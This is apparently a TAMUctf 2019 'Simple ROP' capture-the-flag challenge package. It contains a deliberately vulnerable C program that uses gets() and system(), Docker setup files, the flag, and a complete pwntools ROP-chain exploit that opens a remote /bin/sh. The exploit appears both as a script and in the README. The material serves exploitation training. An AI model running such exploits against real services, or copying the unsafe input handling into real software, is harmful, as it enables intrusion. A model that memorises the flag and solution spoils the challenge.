{
    "Dockerfile": "FROM 32bit/ubuntu:16.04\n\nRUN apt update\nRUN apt install -y socat\n\nRUN groupadd ctf\n\nRUN mkdir /pwn\n\nCOPY entry.sh /entry.sh\nCOPY pwn5 /pwn/pwn5\nCOPY flag.txt /pwn/flag.txt\n\nRUN useradd -G ctf --home=/pwn pwnuser\nRUN useradd -G ctf --home=/pwn pwnflag\n\nRUN chown pwnflag:pwnflag /pwn/flag.txt\nRUN chown pwnflag:pwnflag /pwn/pwn5\n\nRUN chmod 4755 /pwn/pwn5\nRUN chmod 444 /pwn/flag.txt\n\nEXPOSE 4325\nCMD [\"./entry.sh\"]\n",
    "entry.sh": "#!/bin/bash\nwhile :\ndo\n    su -c \"socat TCP4-listen:4325,reuseaddr,fork EXEC:/pwn/pwn5\" - pwnuser\ndone\n",
    "flag.txt": "gigem{r37urn_0r13n73d_pr4c71c3}\n",
    "Makefile": "all: pwn\n\npwn: simple_rop.c\n\tgcc -fno-stack-protector -no-pie simple_rop.c -m32 -static -o pwn5\n",
    "pwn5": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2019-master\\tamuctf-2019-master\\pwn\\pwn5\\pwn5]",
    "pwn_rop.py": "from pwn import *\n\n#r = process('./pwn5')\nr = remote('172.17.0.2', 4325)\n        # Padding goes here\np = '/'*17\n\np += p32( 0x0806f68a) # pop edx ; ret\np += p32( 0x080eb060) # @ .data\np += p32( 0x080b8836) # pop eax ; ret\np += '/bin'\np += p32( 0x0805501b) # mov dword ptr [edx], eax ; ret\np += p32( 0x0806f68a) # pop edx ; ret\np += p32( 0x080eb064) # @ .data + 4\np += p32( 0x080b8836) # pop eax ; ret\np += '//sh'\np += p32( 0x0805501b) # mov dword ptr [edx], eax ; ret\np += p32( 0x0806f68a) # pop edx ; ret\np += p32( 0x080eb068) # @ .data + 8\np += p32( 0x08049373) # xor eax, eax ; ret\np += p32( 0x0805501b) # mov dword ptr [edx], eax ; ret\np += p32( 0x080481c9) # pop ebx ; ret\np += p32( 0x080eb060) # @ .data\np += p32( 0x080df3bd) # pop ecx ; ret\np += p32( 0x080eb068) # @ .data + 8\np += p32( 0x0806f68a) # pop edx ; ret\np += p32( 0x080eb068) # @ .data + 8\np += p32( 0x08049373) # xor eax, eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0806d2d7) # int 0x80\n\nr.sendline(p)\nr.interactive()\n",
    "README.md": "# Simple ROP\n\n## Challenge\n`nc pwn5.tamuctf.com`\n\n## Setup\nBuild the docker container docker `build -t pwn5 .` and run it `docker run pwn5`\n\n## Solution\nNotice that the binary is now static and get a simple ROP Chain going. This can be done with:  \n`ROPgadget --ropchain --binary ./pwn5`.  \nBelow is a sample solution script. This will have to be modified with a new chain everytime the binary is recompiled.\n```python\nfrom pwn import *\n\n#r = process('./pwn5')\nr = remote('172.17.0.2', 4325)\n        # Padding goes here\np = '/'*17\n\np += p32( 0x0806f68a) # pop edx ; ret\np += p32( 0x080eb060) # @ .data\np += p32( 0x080b8836) # pop eax ; ret\np += '/bin'\np += p32( 0x0805501b) # mov dword ptr [edx], eax ; ret\np += p32( 0x0806f68a) # pop edx ; ret\np += p32( 0x080eb064) # @ .data + 4\np += p32( 0x080b8836) # pop eax ; ret\np += '//sh'\np += p32( 0x0805501b) # mov dword ptr [edx], eax ; ret\np += p32( 0x0806f68a) # pop edx ; ret\np += p32( 0x080eb068) # @ .data + 8\np += p32( 0x08049373) # xor eax, eax ; ret\np += p32( 0x0805501b) # mov dword ptr [edx], eax ; ret\np += p32( 0x080481c9) # pop ebx ; ret\np += p32( 0x080eb060) # @ .data\np += p32( 0x080df3bd) # pop ecx ; ret\np += p32( 0x080eb068) # @ .data + 8\np += p32( 0x0806f68a) # pop edx ; ret\np += p32( 0x080eb068) # @ .data + 8\np += p32( 0x08049373) # xor eax, eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0807aecf) # inc eax ; ret\np += p32( 0x0806d2d7) # int 0x80\n\nr.sendline(p)\nr.interactive()\n```\n",
    "simple_rop.c": "#include \"unistd.h\"\n#include \"stdio.h\"\n#include \"stdlib.h\"\n#include \"string.h\"\n\nvoid run_cmd(char* user_in) {\n    char user_cmd[10];\n    snprintf(user_cmd, 7, \"ls %s\", user_in);\n    printf(\"Result of %s:\\n\", user_cmd);\n    system(user_cmd);\n}\n\nvoid laas() {\n    printf(\"ls as a service (laas)(Copyright pending)\\n\");\n    printf(\"Version 2: Less secret strings and more portable!\\n\");\n    printf(\"Enter the arguments you would like to pass to ls:\\n\");\n    char user_in[5];\n    gets(user_in);\n    if(strchr(user_in, '/') == NULL)\n        run_cmd(user_in);\n    else\n        printf(\"No slashes allowed\\n\");\n}\n\nint main() {\n    setvbuf(stdout,_IONBF,0,0);\n    while(1)\n        laas();\n}\n",
    "category": "Pwn"
}